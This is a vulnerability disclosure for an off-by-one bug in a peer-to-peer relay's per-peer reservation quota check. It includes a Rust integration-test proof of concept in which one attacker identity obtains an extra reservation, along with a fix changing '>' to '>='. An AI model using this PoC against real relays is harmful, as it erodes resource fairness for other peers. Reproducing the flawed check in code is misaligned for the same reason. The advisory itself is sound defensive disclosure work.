resource quota enforcement bug


### Summary

An off-by-one error in the relay v2 reservation admission logic allows a remote peer to exceed the configured `max_reservations_per_peer` limit by one.

A malicious peer can open multiple connections using the same `PeerId` and obtain more reservations than intended, weakening the relay’s per-peer resource quota.


### Details

In `protocols/relay/src/behaviour.rs`, the relay checks whether a peer has exceeded its reservation quota before accepting a new reservation.

The intended invariant is:

```
active_reservations(peer_id) <= max_reservations_per_peer
```

However, the implementation uses a strict comparison:

```rust
(!renewed
    && self
        .reservations
        .get(&event_source)
        .map(|cs| cs.len())
        .unwrap_or(0)
        > self.config.max_reservations_per_peer)
```

when:

```
existing_reservations == max_reservations_per_peer
```

the condition evaluates to `false`, allowing one additional reservation to be admitted.

This results in:

```
active_reservations(peer_id) = max_reservations_per_peer + 1
```

Code path:

```
network HOP RESERVE
→ handler::Event::ReservationReqReceived
→ Behaviour::on_connection_handler_event
→ reservation inserted into self.reservations
```

---

### PoC

A minimal integration test demonstrates the issue.

Test setup:

1. Configure relay with:

```
max_reservations_per_peer = 1
```

2. Generate one attacker keypair (`PeerId`).

3. Open two independent client connections using the same identity.

4. Send a `HOP RESERVE` request from each connection.

Observed:

```
first reservation  → accepted
second reservation → accepted
```

Expected:

```
first reservation  → accepted
second reservation → rejected
```

<details>
<summary>Example Test</summary

Integration test:

```rs

fn build_client_with_config(config: Config) -> Swarm<Client> {
    build_client_with_key(identity::Keypair::generate_ed25519(), config)
}

fn build_client_with_key(local_key: identity::Keypair, config: Config) -> Swarm<Client> {
    let local_peer_id = local_key.public().to_peer_id();

    let (relay_transport, behaviour) = relay::client::new(local_peer_id);
    let transport = upgrade_transport(
        OrTransport::new(relay_transport, MemoryTransport::default()).boxed(),
        &local_key,
    );

    Swarm::new(
        transport,
        Client {
            ping: ping::Behaviour::new(ping::Config::new()),
            relay: behaviour,
        },
        local_peer_id,
        config,
    )
}

#[tokio::test]
async fn per_peer_reservation_limit_can_be_bypassed_by_one_connection() {
    let _ = tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .try_init();

    let relay_addr = Multiaddr::empty().with(Protocol::Memory(rand::random::<u64>()));
    let mut relay = build_relay_with_config(relay::Config {
        max_reservations: 10,
        max_reservations_per_peer: 1,
        reservation_duration: Duration::from_secs(60),
        ..relay::Config::default()
    });
    let relay_peer_id = *relay.local_peer_id();

    relay.listen_on(relay_addr.clone()).unwrap();
    relay.add_external_address(relay_addr.clone());
    tokio::spawn(async move {
        relay.collect::<Vec<_>>().await;
    });

    let attacker_key = identity::Keypair::generate_ed25519();
    let attacker_peer_id = attacker_key.public().to_peer_id();
    let relayed_addr = relay_addr
        .clone()
        .with(Protocol::P2p(relay_peer_id))
        .with(Protocol::P2pCircuit);
    let relayed_addr_with_peer = relayed_addr.clone().with(Protocol::P2p(attacker_peer_id));

    let mut attacker_conn_1 = build_client_with_key(attacker_key.clone(), Config::with_tokio_executor());
    attacker_conn_1.listen_on(relayed_addr.clone()).unwrap();
    assert!(wait_for_dial(&mut attacker_conn_1, relay_peer_id).await);
    wait_for_reservation(
        &mut attacker_conn_1,
        relayed_addr_with_peer.clone(),
        relay_peer_id,
        false,
    )
    .await;

    tokio::spawn(async move {
        attacker_conn_1.collect::<Vec<_>>().await;
    });

    // This second connection uses the same PeerId and should be denied by
    // `max_reservations_per_peer = 1`. It is accepted due to an off-by-one check.
    let mut attacker_conn_2 = build_client_with_key(attacker_key, Config::with_tokio_executor());
    attacker_conn_2.listen_on(relayed_addr).unwrap();
    assert!(wait_for_dial(&mut attacker_conn_2, relay_peer_id).await);
    wait_for_reservation(
        &mut attacker_conn_2,
        relayed_addr_with_peer,
        relay_peer_id,
        false,
    )
    .await;
}

```
</details>

---

### Impact

A remote peer can exceed the per-peer reservation quota by one.

This may enable limited reservation slot hoarding and slightly reduce relay availability for other peers.

The issue does **not cause crashes or memory corruption**, but weakens the intended resource admission policy.

---

### Suggested Fix

Replace the strict comparison:

```diff
- > self.config.max_reservations_per_peer
+ >= self.config.max_reservations_per_peer
```

This restores the invariant:

```
active_reservations(peer_id) <= max_reservations_per_peer
```

---

## Prevent future boundary regressions 

```
Regression tests should cover boundary values:

max_reservations_per_peer = 0
max_reservations_per_peer = 1
max_reservations_per_peer = N
```

status: privately reported
